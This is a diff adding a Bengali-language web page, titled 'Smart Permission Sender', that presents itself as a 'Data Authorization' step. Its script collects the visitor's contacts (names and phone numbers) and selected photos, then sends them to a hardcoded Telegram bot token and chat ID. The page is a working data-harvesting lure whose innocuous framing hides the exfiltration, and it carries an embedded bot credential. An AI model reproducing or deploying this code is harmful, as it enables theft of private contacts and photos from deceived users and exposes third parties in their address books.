@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart Permission Sender</title>
+    <style>
+        :root { --primary: #0088cc; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; }
+        body { font-family: sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .container { background: var(--card); padding: 30px; border-radius: 20px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
+        .btn { background: var(--primary); color: white; border: none; padding: 15px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .info-text { font-size: 14px; color: #94a3b8; margin-bottom: 20px; }
+        #status { margin-top: 15px; font-weight: bold; color: #10b981; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Data Authorization 🛡️</h2>
+    <p class="info-text">এগিয়ে যেতে নিচের ধাপগুলো সম্পন্ন করুন</p>
+    
+    <button class="btn" id="contactBtn">👤 কন্টাক্ট এক্সেস দিন</button>
+    <div id="contact-status" style="font-size: 12px; margin: 5px 0;"></div>
+
+    <hr style="border: 0.5px solid #334155; margin: 20px 0;">
+
+    <input type="file" id="images" multiple accept="image/*" style="display: none;">
+    <button class="btn" onclick="document.getElementById('images').click()">🖼️ ছবি সিলেক্ট করুন</button>
+    <div id="file-count" style="font-size: 12px; margin: 5px 0;"></div>
+
+    <button class="btn" id="finalSend" style="background: #10b981; margin-top: 20px;" disabled>সবকিছু পাঠান</button>
+    
+    <div id="status"></div>
+</div>
+
+<script>
+    const botToken = "7885791804:AAHQjsAsMuBfvVqWga0hub2m0QZ7BrgsAsc";
+    const chatId = "5923885908";
+    
+    let savedContacts = "";
+
+    // কন্টাক্ট পারমিশন ও সিলেকশন
+    document.getElementById('contactBtn').onclick = async () => {
+        if ('contacts' in navigator) {
+            try {
+                // ব্রাউজার এখানে ইউজারের কাছে অনুমতি চাইবে
+                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                if (contacts.length > 0) {
+                    savedContacts = contacts.map(c => `${c.name}: ${c.tel.join(', ')}`).join('\n');
+                    document.getElementById('contact-status').innerText = "✅ কন্টাক্ট অনুমতি পাওয়া গেছে";
+                    checkReady();
+                }
+            } catch (err) {
+                document.getElementById('contact-status').innerText = "❌ অনুমতি বাতিল করা হয়েছে";
+            }
+        } else {
+            alert("আপনার ফোনে অটোমেটিক কন্টাক্ট পিকার সাপোর্ট করে না।");
+        }
+    };
+
+    document.getElementById('images').onchange = () => {
+        const count = document.getElementById('images').files.length;
+        document.getElementById('file-count').innerText = `✅ ${count} টি ছবি সিলেক্ট করা হয়েছে`;
+        checkReady();
+    };
+
+    function checkReady() {
+        if (document.getElementById('images').files.length > 0) {
+            document.getElementById('finalSend').disabled = false;
+        }
+    }
+
+    document.getElementById('finalSend').onclick = async () => {
+        const btn = document.getElementById('finalSend');
+        const status = document.getElementById('status');
+        const files = document.getElementById('images').files;
+
+        btn.disabled = true;
+        btn.innerText = "প্রসেস হচ্ছে...";
+
+        // কন্টাক্ট ডাটা পাঠানো
+        if (savedContacts) {
+            const text = `📁 সংগৃহীত কন্টাক্ট লিস্ট:\n\n${savedContacts}`;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+        }
+
+        // ছবিগুলো পাঠানো
+        for (let i = 0; i < files.length; i++) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', files[i]);
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
+            status.innerText = `পাঠানো হচ্ছে: ${i + 1}/${files.length}`;
+        }
+
+        status.innerText = "🎉 সব ডাটা সফলভাবে পাঠানো হয়েছে!";
+        btn.innerText = "সবকিছু পাঠান";
+        btn.disabled = false;
+    };
+</script>
+
+</body>
+</html>
